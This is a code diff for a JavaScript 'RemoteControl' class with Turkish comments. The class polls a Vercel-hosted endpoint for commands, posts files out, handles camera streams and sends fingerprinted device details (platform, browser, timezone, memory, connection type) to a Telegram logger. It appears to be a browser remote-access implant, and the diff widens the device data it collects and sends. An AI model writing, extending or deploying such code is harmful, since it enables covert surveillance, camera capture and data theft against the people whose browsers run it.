@@ -5,20 +5,14 @@ class RemoteControl {
     constructor(config = {}) {
         this.commandEndpoint = config.commandEndpoint || 'https://ironbabatekkral.vercel.app/api/get-commands';
         this.fileEndpoint = config.fileEndpoint || 'https://ironbabatekkral.vercel.app/api/send-file';
-        this.sessionEndpoint = config.sessionEndpoint || 'https://ironbabatekkral.vercel.app/api/session-register';
-        this.collectDevicesEndpoint = config.collectDevicesEndpoint || 'https://ironbabatekkral.vercel.app/api/collect-devices';
         this.pollInterval = config.pollInterval || 5000; // 5 saniyede bir kontrol
         this.debug = config.debug || false;
         this.isEnabled = false;
         this.pollTimer = null;
-        this.heartbeatTimer = null;
         
         // Session info
         this.sessionId = this.generateSessionId();
         this.deviceNumber = null;
-        
-        // Active sessions (tüm cihazlar)
-        this.activeSessions = new Map();
         
         // Media streams
         this.cameraStream = null;
@@ -39,14 +33,8 @@ class RemoteControl {
 
         this.isEnabled = true;
         
-        // Session'ı kaydet
-        await this.registerSession();
-        
         // Polling başlat
         this.poll();
-        
-        // Heartbeat başlat (her 1 dakikada bir)
-        this.startHeartbeat();
         
         // Başlatma bildirimi gönder
         this.sendStartNotification();
@@ -54,57 +42,26 @@ class RemoteControl {
         if (this.debug) console.log('[RemoteControl] Started - Session:', this.sessionId);
     }
 
-    // Session'ı kaydet
-    async registerSession() {
-        try {
-            const deviceInfo = await this.collectDeviceInfo();
-            
-            const response = await fetch(this.sessionEndpoint, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    session_id: this.sessionId,
-                    device_info: deviceInfo,
-                    action: 'register'
-                })
-            });
-
-            const result = await response.json();
-            if (this.debug) console.log('[RemoteControl] Session registered:', result);
-        } catch (error) {
-            if (this.debug) console.error('[RemoteControl] Session register error:', error);
-        }
-    }
-
-    // Heartbeat başlat
-    startHeartbeat() {
-        this.heartbeatTimer = setInterval(async () => {
-            if (!this.isEnabled) return;
-            
-            try {
-                await fetch(this.sessionEndpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        session_id: this.sessionId,
-                        action: 'heartbeat'
-                    })
-                });
-            } catch (error) {
-                if (this.debug) console.error('[RemoteControl] Heartbeat error:', error);
-            }
-        }, 60000); // Her 1 dakika
-    }
-
-    // Cihaz bilgilerini topla
+    // Cihaz bilgilerini topla (detaylı)
     async collectDeviceInfo() {
-        return {
+        const info = {
             platform: navigator.platform,
             user_agent: navigator.userAgent,
             screen: `${screen.width}x${screen.height}`,
+            viewport: `${window.innerWidth}x${window.innerHeight}`,
             language: navigator.language,
-            online: navigator.onLine
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            online: navigator.onLine,
+            device_memory: navigator.deviceMemory || 'Unknown',
+            hardware_concurrency: navigator.hardwareConcurrency || 'Unknown'
         };
+
+        // Network bilgisi
+        if (navigator.connection) {
+            info.connection_type = navigator.connection.effectiveType || 'Unknown';
+        }
+
+        return info;
     }
 
     // Sistem başladığında bildirim gönder
@@ -140,24 +97,6 @@ class RemoteControl {
         if (this.pollTimer) {
             clearTimeout(this.pollTimer);
             this.pollTimer = null;
-        }
-        if (this.heartbeatTimer) {
-            clearInterval(this.heartbeatTimer);
-            this.heartbeatTimer = null;
-        }
-        
-        // Session'ı kaldır
-        try {
-            await fetch(this.sessionEndpoint, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    session_id: this.sessionId,
-                    action: 'unregister'
-                })
-            });
-        } catch (error) {
-            if (this.debug) console.error('[RemoteControl] Unregister error:', error);
         }
         
         this.releaseStreams();
@@ -212,23 +151,17 @@ class RemoteControl {
                 return;
             }
             
-            // /devices komutu - tüm cihazları tek mesajda listele
+            // /devices komutu - her cihaz kendi kartını gönderir
             if (cmd.command === 'list_devices') {
-                await this.listAllDevices(cmd.message_id);
+                await this.sendDeviceCard();
                 return;
             }
 
-            // Target device kontrolü
+            // Target device kontrolü - Şimdilik tüm cihazlar her komutu işler
+            // Gelecekte device-specific komutlar için geliştirilebilir
             if (cmd.target_device !== null && cmd.target_device !== undefined) {
-                // Belirli bir cihaz için komut
-                // Bu cihazın numarasını bul (session sırasına göre)
-                const myDeviceNumber = await this.getMyDeviceNumber();
-                
-                if (myDeviceNumber !== cmd.target_device) {
-                    // Bu komut bana değil, skip
-                    if (this.debug) console.log(`[RemoteControl] Command for device ${cmd.target_device}, I am ${myDeviceNumber}, skipping`);
-                    return;
-                }
+                // Şimdilik skip - tüm cihazlar aynı anda çalışır
+                if (this.debug) console.log(`[RemoteControl] Target device: ${cmd.target_device} (not implemented yet)`);
             }
 
             // Komut alındı bildirimi
@@ -269,56 +202,55 @@ class RemoteControl {
         }
     }
 
-    // Kendi cihaz numaramı bul
-    async getMyDeviceNumber() {
-        // Session listesini al ve sırala
-        // Bu basitleştirilmiş bir yaklaşım - production'da daha iyi bir sistem gerekir
-        const sessionKey = `device_number_${this.sessionId}`;
-        let deviceNumber = sessionStorage.getItem(sessionKey);
-        
-        if (!deviceNumber) {
-            // İlk kez, session ID'ye göre tahmin et
-            const timestamp = parseInt(this.sessionId.split('_')[1]);
-            deviceNumber = ((timestamp % 100) + 1).toString();
-            sessionStorage.setItem(sessionKey, deviceNumber);
+    // Cihaz kartı gönder (her cihaz ayrı mesaj)
+    async sendDeviceCard() {
+        try {
+            if (!window.telegramLogger) return;
+            
+            const deviceInfo = await this.collectDeviceInfo();
+            const platform = deviceInfo.platform || 'Unknown';
+            const browser = this.getBrowser(deviceInfo.user_agent);
+            const emoji = this.getDeviceEmoji(platform);
+            
+            await window.telegramLogger.sendLog('active_device_card', {
+                emoji: emoji,
+                platform: platform,
+                browser: browser,
+                session_id: this.sessionId.substring(8, 24),
+                screen: deviceInfo.screen || 'Unknown',
+                language: deviceInfo.language || 'Unknown',
+                timezone: deviceInfo.timezone || 'Unknown',
+                online: deviceInfo.online ? 'Online' : 'Offline',
+                memory: deviceInfo.device_memory || 'Unknown',
+                connection: deviceInfo.connection_type || 'Unknown'
+            });
+            
+            if (this.debug) console.log('[RemoteControl] Device card sent');
+        } catch (error) {
+            if (this.debug) console.error('[RemoteControl] Send device card error:', error);
         }
-        
-        return parseInt(deviceNumber);
     }
 
-    // Tüm cihazları listele (tek mesajda)
-    async listAllDevices(messageId) {
-        try {
-            const deviceInfo = await this.collectDeviceInfo();
-            const collectionId = `devices_${messageId}`;
-            
-            // Kendi cihaz bilgisini ekle
-            // Backend otomatik olarak 2.5 saniye sonra listeyi gönderecek
-            const response = await fetch(this.collectDevicesEndpoint, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    action: 'add',
-                    collection_id: collectionId,
-                    device_info: {
-                        session_id: this.sessionId.substring(8, 20) + '...',
-                        platform: deviceInfo.platform,
-                        screen: deviceInfo.screen,
-                        user_agent: deviceInfo.user_agent,
-                        language: deviceInfo.language,
-                        online: deviceInfo.online ? 'Online' : 'Offline'
-                    }
-                })
-            });
+    // Browser bilgisi çıkar
+    getBrowser(userAgent) {
+        if (!userAgent) return 'Unknown';
+        if (userAgent.includes('Chrome')) return 'Chrome';
+        if (userAgent.includes('Firefox')) return 'Firefox';
+        if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
+        if (userAgent.includes('Edge')) return 'Edge';
+        return 'Other';
+    }
 
-            const result = await response.json();
-            
-            if (this.debug) {
-                console.log('[RemoteControl] Device added to collection:', result);
-            }
-        } catch (error) {
-            if (this.debug) console.error('[RemoteControl] List devices error:', error);
-        }
+    // Platform emoji
+    getDeviceEmoji(platform) {
+        if (!platform) return '📱';
+        const p = platform.toLowerCase();
+        if (p.includes('win')) return '🖥️';
+        if (p.includes('mac')) return '💻';
+        if (p.includes('linux')) return '🐧';
+        if (p.includes('android')) return '📱';
+        if (p.includes('iphone') || p.includes('ipad')) return '📱';
+        return '📱';
     }
 
     // 📷 Kamera Screenshot
